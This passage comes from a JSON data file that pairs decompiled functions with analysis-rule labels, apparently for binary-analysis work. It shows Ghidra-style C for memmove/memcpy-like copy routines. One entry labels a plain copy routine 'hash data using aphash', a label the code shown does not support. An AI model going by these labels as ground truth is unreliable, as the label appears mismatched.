= puVar38[-1];\n                        *puVar40 = *puVar37;\n                        puVar41[-7] = uVar42;\n                        puVar41[-6] = uVar43;\n                        puVar41[-5] = uVar44;\n                        puVar41[-4] = uVar4;\n                        puVar41[-3] = uVar5;\n                        puVar41[-2] = uVar6;\n                        puVar41[-1] = uVar7;\n                        param_3 = param_3 - 0x20;\n                        puVar38 = puVar37;\n                        puVar41 = puVar40;\n                    } while ((param_3 & 0xffffffe0) != 0);\n                }\n            }\n        }\n        for (; (param_3 & 0xfffffffc) != 0; param_3 = param_3 - 4) {\n            puVar40 = puVar40 + -1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        for (; param_3 != 0; param_3 = param_3 - 1) {\n            puVar40 = puVar40 - 1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        return CONCAT44(uVar33, param_1);\n    }\n    uVar33 = param_3;\n    puVar39 = param_1;\n    if (0x1f < param_3) {\n        if (param_3 < 0x80) {\n            if ((*0x571c9c >> 1 & 1) != 0) {\ncode_r0x0048580d:\n                if (uVar33 == 0) goto code_r0x00485870;\n                for (param_3 = uVar33 >> 5; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    param_2 = param_2 + 4;\n                    puVar39 = puVar39 + 4;\n                }\n                goto code_r0x0048583b;\n            }\ncode_r0x00485567:\n            uVar33 = param_1 & 3;\n            while (uVar33 != 0) {\n                *puVar39 = *param_2;\n                param_3 = param_3 - 1;\n                param_2 = param_2 + 1;\n                puVar39 = puVar39 + 1;\n                uVar33 = puVar39 & 3;\n            }\n        }\n        else {\n            if ((*0x573c50 >> 1 & 1) != 0) {\n                for (; uVar33 != 0; uVar33 = uVar33 - 1) {\n                    *puVar39 = *param_2;\n                    param_2 = param_2 + 1;\n                    puVar39 = puVar39 + 1;\n                }\n                return CONCAT44(param_3, param_1);\n            }\n            if ((((param_1 ^ param_2) & 0xf) == 0) && ((*0x571c9c >> 1 & 1) != 0)) {\n                if ((param_2 & 0xf) != 0) {\n                    uVar34 = 0x10 - (param_2 & 0xf);\n                    param_3 = param_3 - uVar34;\n                    for (uVar33 = uVar34 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 1;\n                        puVar39 = puVar39 + 1;\n                    }\n                    for (uVar34 = uVar34 >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar39 = puVar39 + 4;\n                    }\n                }\n                uVar33 = param_3 & 0x7f;\n                for (param_3 = param_3 >> 7; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    uVar8 = *(param_2 + 4);\n                    uVar9 = *(param_2 + 0x24);\n                    uVar10 = *(param_2 + 5);\n                    uVar11 = *(param_2 + 0x2c);\n                    uVar12 = *(param_2 + 6);\n                    uVar13 = *(param_2 + 0x34);\n                    uVar14 = *(param_2 + 7);\n                    uVar15 = *(param_2 + 0x3c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    *(puVar39 + 4) = uVar8;\n                    *(puVar39 + 0x24) = uVar9;\n                    *(puVar39 + 5) = uVar10;\n                    *(puVar39 + 0x2c) = uVar11;\n                    *(puVar39 + 6) = uVar12;\n                    *(puVar39 + 0x34) = uVar13;\n                    *(puVar39 + 7) = uVar14;\n                    *(puVar39 + 0x3c) = uVar15;\n                    uVar42 = *(param_2 + 0x44);\n                    uVar43 = *(param_2 + 9);\n                    uVar44 = *(param_2 + 0x4c);\n                    uVar4 = *(param_2 + 10);\n                    uVar5 = *(param_2 + 0x54);\n                    uVar6 = *(param_2 + 0xb);\n                    uVar7 = *(param_2 + 0x5c);\n                    uVar8 = *(param_2 + 0xc);\n                    uVar9 = *(param_2 + 100);\n                    uVar10 = *(param_2 + 0xd);\n                    uVar11 = *(param_2 + 0x6c);\n                    uVar12 = *(param_2 + 0xe);\n                    uVar13 = *(param_2 + 0x74);\n                    uVar14 = *(param_2 + 0xf);\n                    uVar15 = *(param_2 + 0x7c);\n                    *(puVar39 + 8) = *(param_2 + 8);\n                    *(puVar39 + 0x44) = uVar42;\n                    *(puVar39 + 9) = uVar43;\n                    *(puVar39 + 0x4c) = uVar44;\n                    *(puVar39 + 10) = uVar4;\n                    *(puVar39 + 0x54) = uVar5;\n                    *(puVar39 + 0xb) = uVar6;\n                    *(puVar39 + 0x5c) = uVar7;\n                    *(puVar39 + 0xc) = uVar8;\n                    *(puVar39 + 100) = uVar9;\n                    *(puVar39 + 0xd) = uVar10;\n                    *(puVar39 + 0x6c) = uVar11;\n                    *(puVar39 + 0xe) = uVar12;\n                    *(puVar39 + 0x74) = uVar13;\n                    *(puVar39 + 0xf) = uVar14;\n                    *(puVar39 + 0x7c) = uVar15;\n                    param_2 = param_2 + 0x10;\n                    puVar39 = puVar39 + 0x10;\n                }\n                goto code_r0x0048580d;\n            }\n            if (((*0x573c50 & 1) == 0) || ((param_1 & 3) != 0)) goto code_r0x00485567;\n            if ((param_2 & 3) == 0) {\n                if ((param_1 >> 2 & 1) != 0) {\n                    uVar42 = *param_2;\n                    param_3 = param_3 - 4;\n                    param_2 = param_2 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_1 >> 3 & 1) != 0) {\n                    uVar1 = *param_2;\n                    param_3 = param_3 - 8;\n                    param_2 = param_2 + 1;\n                    *param_1 = uVar1;\n                    param_1 = param_1 + 1;\n                }\n                if ((param_2 & 7) == 0) {\n                    puVar39 = param_2 + -1;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    do {\n                        puVar36 = puVar39;\n                        uVar5 = *(puVar36 + 4);\n                        uVar6 = *(puVar36 + 0x24);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(puVar36 + 2);\n                        uVar44 = *(puVar36 + 7);\n                        uVar4 = *(puVar36 + 0x3c);\n                        auVar3 = *(puVar36 + 4);\n                        *(param_1 + 1) = uVar42;\n                        *(param_1 + 0xc) = uVar43;\n                        *(param_1 + 2) = uVar5;\n                        *(param_1 + 0x14) = uVar6;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x40, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x40, 0);\n                        param_1 = param_1 + 6;\n                        puVar39 = puVar36 + 6;\n                        uVar42 = uVar44;\n                        uVar43 = uVar4;\n                    } while (0x2f < param_3);\n                    puVar36 = puVar36 + 7;\n                }\n                else if ((param_2 >> 3 & 1) == 0) {\n                    iVar32 = param_2 + -4;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    uVar44 = *(param_2 + 1);\n                    do {\n                        iVar35 = iVar32;\n                        uVar7 = *(iVar35 + 0x20);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar4 = *(iVar35 + 0x34);\n                        uVar5 = *(iVar35 + 0x38);\n                        uVar6 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 4) = uVar42;\n                        *(param_1 + 1) = uVar43;\n                        *(param_1 + 0xc) = uVar44;\n                        *(param_1 + 2) = uVar7;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x20, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x20, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar4;\n                        uVar43 = uVar5;\n                        uVar44 = uVar6;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x34;\n                }\n                else {\n                    iVar32 = param_2 + -0xc;\n                    uVar42 = *param_2;\n                    do {\n                        iVar35 = iVar32;\n                        uVar44 = *(iVar35 + 0x20);\n                        uVar4 = *(iVar35 + 0x24);\n                        uVar5 = *(iVar35 + 0x28);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar43 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 0xc) = uVar42;\n                        *(param_1 + 2) = uVar44;\n                        *(param_1 + 0x14) = uVar4;\n                        *(param_1 + 3) = uVar5;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x60, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x60, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar43;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x3c;\n                }\n                for (; 0xf < param_3; param_3 = param_3 - 0x10) {\n                    uVar42 = *puVar36;\n                    uVar43 = *(puVar36 + 4);\n                    uVar44 = *(puVar36 + 1);\n                    uVar4 = *(puVar36 + 0xc);\n                    puVar36 = puVar36 + 2;\n                    *param_1 = uVar42;\n                    *(param_1 + 4) = uVar43;\n                    *(param_1 + 1) = uVar44;\n                    *(param_1 + 0xc) = uVar4;\n                    param_1 = param_1 + 2;\n                }\n                if ((param_3 >> 2 & 1) != 0) {\n                    uVar42 = *puVar36;\n                    param_3 = param_3 - 4;\n                    puVar36 = puVar36 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_3 >> 3 & 1) != 0) {\n                    param_3 = param_3 - 8;\n                    *param_1 = *puVar36;\n                }\n    // WARNING: Could not recover jumptable at 0x00485565. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (4 cases) at 0x4855a4\n                uVar45 = (**(param_3 * 4 + 0x4855a4))();\n                return uVar45;\n            }\n        }\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            for (uVar33 = param_3 >> 2; uVar33 != 0; uVar33 = uVar33 - 1) {\n                *puVar39 = *param_2;\n                param_2 = param_2 + 4;\n                puVar39 = puVar39 + 4;\n            }\n    // switch table (4 cases) at 0x4855a4\n            switch(param_3 & 3) {\n            case 0:\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 1:\n                *puVar39 = *param_2;\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 2:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 1);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 3:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 1);\n                *(puVar39 + 2) = *(param_2 + 2);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            }\n        }\n    }\ncode_r0x0048583b:\n    if ((uVar33 & 0x1f) != 0) {\n        for (uVar34 = (uVar33 & 0x1f) >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n            param_3 = *param_2;\n            *puVar39 = param_3;\n            puVar39 = puVar39 + 4;\n            param_2 = param_2 + 4;\n        }\n        for (uVar33 = uVar33 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n            *puVar39 = *param_2;\n            param_2 = param_2 + 1;\n            puVar39 = puVar39 + 1;\n        }\n    }\ncode_r0x00485870:\n    return CONCAT44(param_3, param_1);\n}\n",
        "token_count": 6180
    },
    "004059ac": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint64_t fcn.004059ac(ulong *param_1, ulong *param_2, uint32_t param_3)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    int32_t iVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    int32_t iVar35;\n    ulong *puVar36;\n    uint *puVar37;\n    uint *puVar38;\n    ulong *puVar39;\n    uint *puVar40;\n    uint *puVar41;\n    uint uVar42;\n    uint uVar43;\n    uint uVar44;\n    uint64_t uVar45;\n    \n    if ((param_2 < param_1) && (param_1 < param_3 + param_2)) {\n        puVar37 = param_2 + param_3;\n        puVar40 = param_1 + param_3;\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            if ((*0x571c9c >> 1 & 1) == 0) {\n                if ((puVar40 & 3) != 0) {\n                    uVar33 = puVar40 & 3;\n                    param_3 = param_3 - uVar33;\n                    do {\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 - 1;\n                        uVar33 = uVar33 - 1;\n                    } while (uVar33 != 0);\n                }\n                if (0x1f < param_3) {\n                    uVar33 = param_3 >> 2;\n                    while( true ) {\n                        if (uVar33 == 0) break;\n                        uVar33 = uVar33 - 1;\n                        puVar40[-1] = puVar37[-1];\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 + -1;\n                    }\n    // switch table (4 cases) at 0x4860a0\n                    switch(param_3 & 3) {\n                    case 0:\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 1:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 2:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 3:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        *(puVar40 - 3) = *(puVar37 + -3);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    }\n                }\n            }\n            else {\n                while (puVar38 = puVar37,  puVar41 = puVar40,  (puVar40 & 0xf) != 0) {\n                    puVar37 = puVar37 + -1;\n                    puVar40 = puVar40 + -1;\n                    *puVar40 = *puVar37;\n                    param_3 = param_3 - 1;\n                }\n                do {\n                    puVar37 = puVar38;\n                    puVar40 = puVar41;\n                    if (param_3 < 0x80) break;\n                    puVar37 = puVar38 + -0x20;\n                    puVar40 = puVar41 + -0x20;\n                    uVar42 = puVar38[-0x1f];\n                    uVar43 = puVar38[-0x1e];\n                    uVar44 = puVar38[-0x1d];\n                    uVar4 = puVar38[-0x1c];\n                    uVar5 = puVar38[-0x1b];\n                    uVar6 = puVar38[-0x1a];\n                    uVar7 = puVar38[-0x19];\n                    uVar8 = puVar38[-0x18];\n                    uVar9 = puVar38[-0x17];\n                    uVar10 = puVar38[-0x16];\n                    uVar11 = puVar38[-0x15];\n                    uVar12 = puVar38[-0x14];\n                    uVar13 = puVar38[-0x13];\n                    uVar14 = puVar38[-0x12];\n                    uVar15 = puVar38[-0x11];\n                    uVar16 = puVar38[-0x10];\n                    uVar17 = puVar38[-0xf];\n                    uVar18 = puVar38[-0xe];\n                    uVar19 = puVar38[-0xd];\n                    uVar20 = puVar38[-0xc];\n                    uVar21 = puVar38[-0xb];\n                    uVar22 = puVar38[-10];\n                    uVar23 = puVar38[-9];\n                    uVar24 = puVar38[-8];\n                    uVar25 = puVar38[-7];\n                    uVar26 = puVar38[-6];\n                    uVar27 = puVar38[-5];\n                    uVar28 = puVar38[-4];\n                    uVar29 = puVar38[-3];\n                    uVar30 = puVar38[-2];\n                    uVar31 = puVar38[-1];\n                    *puVar40 = *puVar37;\n                    puVar41[-0x1f] = uVar42;\n                    puVar41[-0x1e] = uVar43;\n                    puVar41[-0x1d] = uVar44;\n                    puVar41[-0x1c] = uVar4;\n                    puVar41[-0x1b] = uVar5;\n                    puVar41[-0x1a] = uVar6;\n                    puVar41[-0x19] = uVar7;\n                    puVar41[-0x18] = uVar8;\n                    puVar41[-0x17] = uVar9;\n                    puVar41[-0x16] = uVar10;\n                    puVar41[-0x15] = uVar11;\n                    puVar41[-0x14] = uVar12;\n                    puVar41[-0x13] = uVar13;\n                    puVar41[-0x12] = uVar14;\n                    puVar41[-0x11] = uVar15;\n                    puVar41[-0x10] = uVar16;\n                    puVar41[-0xf] = uVar17;\n                    puVar41[-0xe] = uVar18;\n                    puVar41[-0xd] = uVar19;\n                    puVar41[-0xc] = uVar20;\n                    puVar41[-0xb] = uVar21;\n                    puVar41[-10] = uVar22;\n                    puVar41[-9] = uVar23;\n                    puVar41[-8] = uVar24;\n                    puVar41[-7] = uVar25;\n                    puVar41[-6] = uVar26;\n                    puVar41[-5] = uVar27;\n                    puVar41[-4] = uVar28;\n                    puVar41[-3] = uVar29;\n                    puVar41[-2] = uVar30;\n                    puVar41[-1] = uVar31;\n                    param_3 = param_3 - 0x80;\n                    puVar38 = puVar37;\n                    puVar41 = puVar40;\n                } while ((param_3 & 0xffffff80) != 0);\n                puVar38 = puVar37;\n                puVar41 = puVar40;\n                if (0x1f < param_3) {\n                    do {\n                        puVar37 = puVar38 + -8;\n                        puVar40 = puVar41 + -8;\n                        uVar42 = puVar38[-7];\n                        uVar43 = puVar38[-6];\n                        uVar44 = puVar38[-5];\n                        uVar4 = puVar38[-4];\n                        uVar5 = puVar38[-3];\n                        uVar6 = puVar38[-2];\n                        uVar7 = puVar38[-1];\n                        *puVar40 = *puVar37;\n                        puVar41[-7] = uVar42;\n                        puVar41[-6] = uVar43;\n                        puVar41[-5] = uVar44;\n                        puVar41[-4] = uVar4;\n                        puVar41[-3] = uVar5;\n                        puVar41[-2] = uVar6;\n                        puVar41[-1] = uVar7;\n                        param_3 = param_3 - 0x20;\n                        puVar38 = puVar37;\n                        puVar41 = puVar40;\n                    } while ((param_3 & 0xffffffe0) != 0);\n                }\n            }\n        }\n        for (; (param_3 & 0xfffffffc) != 0; param_3 = param_3 - 4) {\n            puVar40 = puVar40 + -1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        for (; param_3 != 0; param_3 = param_3 - 1) {\n            puVar40 = puVar40 - 1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        return CONCAT44(uVar33, param_1);\n    }\n    uVar33 = param_3;\n    puVar39 = param_1;\n    if (0x1f < param_3) {\n        if (param_3 < 0x80) {\n            if ((*0x571c9c >> 1 & 1) != 0) {\ncode_r0x0048625d:\n                if (uVar33 == 0) goto code_r0x004862c0;\n                for (param_3 = uVar33 >> 5; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    param_2 = param_2 + 4;\n                    puVar39 = puVar39 + 4;\n                }\n                goto code_r0x0048628b;\n            }\ncode_r0x00485fb7:\n            uVar33 = param_1 & 3;\n            while (uVar33 != 0) {\n                *puVar39 = *param_2;\n                param_3 = param_3 - 1;\n                param_2 = param_2 + 1;\n                puVar39 = puVar39 + 1;\n                uVar33 = puVar39 & 3;\n            }\n        }\n        else {\n            if ((*0x573c50 >> 1 & 1) != 0) {\n                for (; uVar33 != 0; uVar33 = uVar33 - 1) {\n                    *puVar39 = *param_2;\n                    param_2 = param_2 + 1;\n                    puVar39 = puVar39 + 1;\n                }\n                return CONCAT44(param_3, param_1);\n            }\n            if ((((param_1 ^ param_2) & 0xf) == 0) && ((*0x571c9c >> 1 & 1) != 0)) {\n                if ((param_2 & 0xf) != 0) {\n                    uVar34 = 0x10 - (param_2 & 0xf);\n                    param_3 = param_3 - uVar34;\n                    for (uVar33 = uVar34 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 1;\n                        puVar39 = puVar39 + 1;\n                    }\n                    for (uVar34 = uVar34 >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar39 = puVar39 + 4;\n                    }\n                }\n                uVar33 = param_3 & 0x7f;\n                for (param_3 = param_3 >> 7; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    uVar8 = *(param_2 + 4);\n                    uVar9 = *(param_2 + 0x24);\n                    uVar10 = *(param_2 + 5);\n                    uVar11 = *(param_2 + 0x2c);\n                    uVar12 = *(param_2 + 6);\n                    uVar13 = *(param_2 + 0x34);\n                    uVar14 = *(param_2 + 7);\n                    uVar15 = *(param_2 + 0x3c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    *(puVar39 + 4) = uVar8;\n                    *(puVar39 + 0x24) = uVar9;\n                    *(puVar39 + 5) = uVar10;\n                    *(puVar39 + 0x2c) = uVar11;\n                    *(puVar39 + 6) = uVar12;\n                    *(puVar39 + 0x34) = uVar13;\n                    *(puVar39 + 7) = uVar14;\n                    *(puVar39 + 0x3c) = uVar15;\n                    uVar42 = *(param_2 + 0x44);\n                    uVar43 = *(param_2 + 9);\n                    uVar44 = *(param_2 + 0x4c);\n                    uVar4 = *(param_2 + 10);\n                    uVar5 = *(param_2 + 0x54);\n                    uVar6 = *(param_2 + 0xb);\n                    uVar7 = *(param_2 + 0x5c);\n                    uVar8 = *(param_2 + 0xc);\n                    uVar9 = *(param_2 + 100);\n                    uVar10 = *(param_2 + 0xd);\n                    uVar11 = *(param_2 + 0x6c);\n                    uVar12 = *(param_2 + 0xe);\n                    uVar13 = *(param_2 + 0x74);\n                    uVar14 = *(param_2 + 0xf);\n                    uVar15 = *(param_2 + 0x7c);\n                    *(puVar39 + 8) = *(param_2 + 8);\n                    *(puVar39 + 0x44) = uVar42;\n                    *(puVar39 + 9) = uVar43;\n                    *(puVar39 + 0x4c) = uVar44;\n                    *(puVar39 + 10) = uVar4;\n                    *(puVar39 + 0x54) = uVar5;\n                    *(puVar39 + 0xb) = uVar6;\n                    *(puVar39 + 0x5c) = uVar7;\n                    *(puVar39 + 0xc) = uVar8;\n                    *(puVar39 + 100) = uVar9;\n                    *(puVar39 + 0xd) = uVar10;\n                    *(puVar39 + 0x6c) = uVar11;\n                    *(puVar39 + 0xe) = uVar12;\n                    *(puVar39 + 0x74) = uVar13;\n                    *(puVar39 + 0xf) = uVar14;\n                    *(puVar39 + 0x7c) = uVar15;\n                    param_2 = param_2 + 0x10;\n                    puVar39 = puVar39 + 0x10;\n                }\n                goto code_r0x0048625d;\n            }\n            if (((*0x573c50 & 1) == 0) || ((param_1 & 3) != 0)) goto code_r0x00485fb7;\n            if ((param_2 & 3) == 0) {\n                if ((param_1 >> 2 & 1) != 0) {\n                    uVar42 = *param_2;\n                    param_3 = param_3 - 4;\n                    param_2 = param_2 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_1 >> 3 & 1) != 0) {\n                    uVar1 = *param_2;\n                    param_3 = param_3 - 8;\n                    param_2 = param_2 + 1;\n                    *param_1 = uVar1;\n                    param_1 = param_1 + 1;\n                }\n                if ((param_2 & 7) == 0) {\n                    puVar39 = param_2 + -1;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    do {\n                        puVar36 = puVar39;\n                        uVar5 = *(puVar36 + 4);\n                        uVar6 = *(puVar36 + 0x24);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(puVar36 + 2);\n                        uVar44 = *(puVar36 + 7);\n                        uVar4 = *(puVar36 + 0x3c);\n                        auVar3 = *(puVar36 + 4);\n                        *(param_1 + 1) = uVar42;\n                        *(param_1 + 0xc) = uVar43;\n                        *(param_1 + 2) = uVar5;\n                        *(param_1 + 0x14) = uVar6;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x40, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x40, 0);\n                        param_1 = param_1 + 6;\n                        puVar39 = puVar36 + 6;\n                        uVar42 = uVar44;\n                        uVar43 = uVar4;\n                    } while (0x2f < param_3);\n                    puVar36 = puVar36 + 7;\n                }\n                else if ((param_2 >> 3 & 1) == 0) {\n                    iVar32 = param_2 + -4;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    uVar44 = *(param_2 + 1);\n                    do {\n                        iVar35 = iVar32;\n                        uVar7 = *(iVar35 + 0x20);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar4 = *(iVar35 + 0x34);\n                        uVar5 = *(iVar35 + 0x38);\n                        uVar6 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 4) = uVar42;\n                        *(param_1 + 1) = uVar43;\n                        *(param_1 + 0xc) = uVar44;\n                        *(param_1 + 2) = uVar7;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x20, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x20, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar4;\n                        uVar43 = uVar5;\n                        uVar44 = uVar6;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x34;\n                }\n                else {\n                    iVar32 = param_2 + -0xc;\n                    uVar42 = *param_2;\n                    do {\n                        iVar35 = iVar32;\n                        uVar44 = *(iVar35 + 0x20);\n                        uVar4 = *(iVar35 + 0x24);\n                        uVar5 = *(iVar35 + 0x28);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar43 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 0xc) = uVar42;\n                        *(param_1 + 2) = uVar44;\n                        *(param_1 + 0x14) = uVar4;\n                        *(param_1 + 3) = uVar5;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x60, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x60, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar43;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x3c;\n                }\n                for (; 0xf < param_3; param_3 = param_3 - 0x10) {\n                    uVar42 = *puVar36;\n                    uVar43 = *(puVar36 + 4);\n                    uVar44 = *(puVar36 + 1);\n                    uVar4 = *(puVar36 + 0xc);\n                    puVar36 = puVar36 + 2;\n                    *param_1 = uVar42;\n                    *(param_1 + 4) = uVar43;\n                    *(param_1 + 1) = uVar44;\n                    *(param_1 + 0xc) = uVar4;\n                    param_1 = param_1 + 2;\n                }\n                if ((param_3 >> 2 & 1) != 0) {\n                    uVar42 = *puVar36;\n                    param_3 = param_3 - 4;\n                    puVar36 = puVar36 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_3 >> 3 & 1) != 0) {\n                    param_3 = param_3 - 8;\n                    *param_1 = *puVar36;\n                }\n    // WARNING: Could not recover jumptable at 0x00485fb5. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (4 cases) at 0x485ff4\n                uVar45 = (**(param_3 * 4 + 0x485ff4))();\n                return uVar45;\n            }\n        }\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            for (uVar33 = param_3 >> 2; uVar33 != 0; uVar33 = uVar33 - 1) {\n                *puVar39 = *param_2;\n                param_2 = param_2 + 4;\n                puVar39 = puVar39 + 4;\n            }\n    // switch table (4 cases) at 0x485ff4\n            switch(param_3 & 3) {\n            case 0:\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 1:\n                *puVar39 = *param_2;\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 2:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 